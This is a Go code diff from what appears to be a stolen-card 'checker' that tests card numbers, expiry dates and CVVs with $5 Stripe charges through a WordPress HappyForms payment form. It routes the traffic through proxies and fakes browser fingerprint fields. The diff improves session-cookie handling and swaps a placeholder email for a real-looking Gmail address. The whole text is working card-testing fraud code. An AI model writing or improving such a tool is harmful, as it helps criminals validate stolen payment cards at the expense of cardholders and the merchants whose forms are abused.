@@ -8,6 +8,7 @@ import (
 	"fmt"
 	"io"
 	"net/http"
+	"net/http/cookiejar"
 	"net/url"
 	"regexp"
 	"strings"
@@ -66,6 +67,7 @@ func parseCard(cc string) (num, mm, yy, cvv string, ok bool) {
 // ─── HTTP Client with proxy ───────────────────────────────────────────────────
 
 func buildClient(proxyURL string, timeout time.Duration) *http.Client {
+	jar, _ := cookiejar.New(nil)
 	transport := &http.Transport{
 		TLSClientConfig: &tls.Config{InsecureSkipVerify: false},
 	}
@@ -75,7 +77,7 @@ func buildClient(proxyURL string, timeout time.Duration) *http.Client {
 			transport.Proxy = http.ProxyURL(parsed)
 		}
 	}
-	return &http.Client{Transport: transport, Timeout: timeout}
+	return &http.Client{Transport: transport, Timeout: timeout, Jar: jar}
 }
 
 // normaliseProxy converts host:port:user:pass or bare host:port into http://... form
@@ -209,7 +211,7 @@ func CheckStripe(req StripeRequest) StripeResult {
 		{randomSeed},
 		{""},                      // single_line_text
 		{"James Smith"},           // single_line_text_2
-		{"test@example.com"},      // email_3
+		{"frabsosgk9@gmail.com"},  // email_3
 		{"5"},                     // payments amount
 		{"stripe"},                // payment_method
 		{"1"},                     // filled
@@ -226,7 +228,7 @@ func CheckStripe(req StripeRequest) StripeResult {
 	formData.Set("happyforms_random_seed", randomSeed)
 	formData.Set(formID+"-single_line_text", "")
 	formData.Set(formID+"_single_line_text_2", "James Smith")
-	formData.Set(formID+"_email_3", "test@example.com")
+	formData.Set(formID+"_email_3", "frabsosgk9@gmail.com")
 	formData.Set(formID+"_payments_1[price]", "5")
 	formData.Set(formID+"_payments_1[payment_method]", "stripe")
 	formData.Set(formID+"_payments_1[filled]", "1")
@@ -242,14 +244,18 @@ func CheckStripe(req StripeRequest) StripeResult {
 	formData.Set("platform_info[outer_height]", "1080")
 	formData.Set("platform_info[connectionRtt]", "100")
 
-	// Set cookies for stripe mid/sid and happyforms checkout
+	// Set cookies on client.Jar (preserving session cookies from Step 1)
+	u, _ := url.Parse(gateURL)
 	stripeMID := generateUUID()
 	stripeSID := generateUUID()
 	pmCookie := fmt.Sprintf(`{"payment_method":"%s"}`, pmID)
-	cookieHeader := fmt.Sprintf(
-		"__stripe_mid=%s; __stripe_sid=%s; happyforms_%s_stripe_checkout=%s",
-		stripeMID, stripeSID, formID, pmCookie,
-	)
+
+	cookies := []*http.Cookie{
+		{Name: "__stripe_mid", Value: stripeMID},
+		{Name: "__stripe_sid", Value: stripeSID},
+		{Name: fmt.Sprintf("happyforms_%s_stripe_checkout", formID), Value: pmCookie},
+	}
+	client.Jar.SetCookies(u, cookies)
 
 	formHeaders := map[string]string{
 		"Content-Type":     "application/x-www-form-urlencoded; charset=UTF-8",
@@ -257,7 +263,6 @@ func CheckStripe(req StripeRequest) StripeResult {
 		"Referer":          gateURL,
 		"User-Agent":       ua,
 		"X-Requested-With": "XMLHttpRequest",
-		"Cookie":           cookieHeader,
 	}
 
 	formBody, err := doPOST(client, gateURL, formData.Encode(), formHeaders)
